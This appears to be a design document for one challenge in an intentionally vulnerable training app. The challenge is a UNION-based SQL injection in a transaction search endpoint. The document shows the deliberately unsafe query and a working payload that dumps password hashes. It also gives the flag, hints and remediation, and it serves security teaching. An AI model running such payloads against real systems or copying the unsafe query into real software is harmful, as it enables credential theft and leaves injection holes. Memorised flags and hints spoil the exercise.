# sqli_transaction_search

| Field | Value |
|---|---|
| OWASP | A03:2021 Injection |
| CWE | CWE-89 SQL Injection (UNION-based) |
| Difficulty | Intermediate |
| Chains into | UNION SELECT → extract `users` table (password hashes, roles) |

## Vulnerable code
`modules/sqli_transaction_search/routes.py: search_transactions()` builds
the SQL query with an f-string:
```python
query = f"SELECT id, description, amount, txn_date FROM transactions " \
        f"WHERE customer_id = {customer_id} AND LOWER(description) LIKE LOWER('%{search_term}%')"
```
The sibling endpoint `GET /transactions` (no `/search`) is NOT vulnerable —
it uses the ORM correctly. Useful contrast for a report: same feature area,
one endpoint safe, one not, because different code paths were written by
different people at different times (realistic).

## Note on database targeting
This app runs on **Postgres** (see `docker-compose.yml`), which strictly
enforces matching column counts/types across `UNION` branches — unlike
SQLite, which is far more permissive. A payload that "works" against
SQLite locally may not work against the real deployment. This module was
built and verified against a real Postgres 16 instance during development
(not just SQLite, which is only used for the fast local pytest suite),
including catching and fixing two real bugs along the way: a case-sensitivity
issue with plain `LIKE` on Postgres, and a gunicorn multi-worker key-sharing
issue in a different module — both are the kind of thing that only shows up
once you test against the real target, not assumptions.

## Player path
1. `GET /transactions/search?q=grocery` — confirm the feature works normally.
2. Try breaking out of the string: `q=nonexistent%') OR ('1'='1` — notice it
   returns rows outside your own customer_id (confirms injection point,
   also its own smaller finding: the customer_id filter itself is bypassable).
3. Determine column count via trial UNION with increasing column counts
   until no error — target table selects 4: `id, description, amount, txn_date`.
4. Full payload (note the closing `)` before UNION — it closes the
   `LOWER(...)` call the search term sits inside):
   ```
   nonexistent%') UNION SELECT id, username || ':' || password_hash || ':' || COALESCE(secret_note, ''), 0, NULL FROM users --
   ```
   URL-encode appropriately when sending via browser/curl.

## Flag location
`admin`'s `secret_note` column, concatenated into the exfiltrated string
above: `DARKVAULT{uni0n_s3l3ct_st4r_fr0m_secrets}`. Note the `COALESCE(...,
'')` around `secret_note` in the payload — without it, SQL's NULL
propagation through `||` would turn the *entire* concatenated string NULL
for any row where `secret_note` is unset (i.e. every non-admin row),
silently blanking out otherwise-successful rows. A real blind/UNION
exfiltration attempt hits this constantly and it's worth recognizing, not
just copy-pasting a payload that happens to work once.

## Hints
- Hint 1: "The list endpoint and the search endpoint hit the same table. Do they behave the same way to unusual input?"
- Hint 2: "This app runs on Postgres, not SQLite — column types matter for UNION here."

## Remediation
- Use bound parameters, always: `text("... WHERE customer_id = :cid AND description LIKE :term").bindparams(cid=customer_id, term=f"%{search_term}%")`, or better, stay in the ORM (`Transaction.query.filter(...)`) like the sibling endpoint already does.
- Least-privilege DB user for the app — even a successful injection shouldn't be able to read tables outside its intended scope.
- Web Application Firewall / query allowlisting as defense in depth, not a substitute for parameterization.
